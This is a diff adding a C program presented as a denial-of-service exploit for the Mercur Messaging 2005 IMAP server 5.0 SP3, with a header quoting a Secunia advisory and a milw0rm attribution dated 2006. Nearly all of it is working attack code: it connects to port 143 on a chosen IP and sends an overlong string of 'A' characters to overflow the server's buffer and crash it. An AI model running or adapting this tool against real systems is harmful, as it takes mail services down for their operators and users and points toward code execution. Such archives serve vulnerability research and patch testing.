@@ -1,0 +1,102 @@
+/**
+Exploit for : IMAP 5.0 SP3 DoS Exploit
+Advisory    : http://secunia.com/advisories/19267/
+Coder       : Omnipresent
+Email       : omnipresent@email.it
+Description : Tim Taylor has discovered a vulnerability in Mercur Messaging 2005, which can be exploited by malicious people and by malicious users to cause a DoS (Denial of Service) or to compromise a vulnerable system.
+
+              The vulnerability is caused due to boundary errors within the handling of IMAP commands. This can be exploited to cause a stack-based buffer overflow via overly long arguments passed to the LOGIN and SELECT commands. Other commands may also be affected.
+
+              Successful exploitation allows arbitrary code execution.
+
+              The vulnerability has been confirmed in version 5.0 SP3. Other versions may also be affected.
+**/
+
+
+
+
+#ifdef _WIN32
+        #include <winsock2.h>
+
+        SOCKET sock;
+        WSADATA wsaData;
+        WORD wVersionRequested;
+
+#else
+        #include <sys/socket.h>
+        #include <netinet/in.h>
+        #define INVALID_SOCKET -1
+        #define SOCKET_ERROR -1
+
+        int sock;
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+   char buf[280];
+   struct sockaddr_in saddr;
+   unsigned long ip;
+   int i;
+
+   if (argc != 2)
+   {
+    printf("IMAP 5.0 SP3 - DoS Exploit!\r\n");
+    printf("Coded by OmniPresent - omnipresent@email.it\r\n");
+    printf("IMAP 5.0 SP3 - DoS Exploit!\r\n");
+    printf("Advisory: http://secunia.com/advisories/19267/\r\n");
+   	printf("%s <IP_Address>\r\n", argv[0]);
+    
+	exit(1);
+   }
+	
+   ip = inet_addr(argv[1]);
+
+#ifdef _WIN32
+   wVersionRequested = MAKEWORD(2, 2);
+   if (WSAStartup(wVersionRequested, &wsaData) < 0)
+   {
+      printf("Unable to initialise Winsock\r\n");
+      exit(1);
+   }
+#endif
+ 
+
+   if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+   {
+      printf("Socket Error \n");
+      exit(1);
+   }
+
+
+   memset(&saddr,'0', sizeof(saddr));
+   saddr.sin_port = htons(143);
+   saddr.sin_family = AF_INET;
+   memcpy(&saddr.sin_addr, (unsigned long *)&ip, sizeof((unsigned long *)&ip));
+
+   if (connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) == SOCKET_ERROR)
+   {
+      printf("Connect Error \n");
+      exit(1);
+   }
+
+   for (i=0; i<278; i++) {
+      buf[i] = 'A';
+   }
+   strcat(buf, "\r\n");
+  
+
+   send(sock, buf, sizeof(buf), 0);
+   
+ #ifdef _WIN32
+ closesocket(sock);
+ #else
+ close(sock);
+ #endif
+ printf("DoS Attack Done!\n");
+}
+
+// milw0rm.com [2006-03-19]
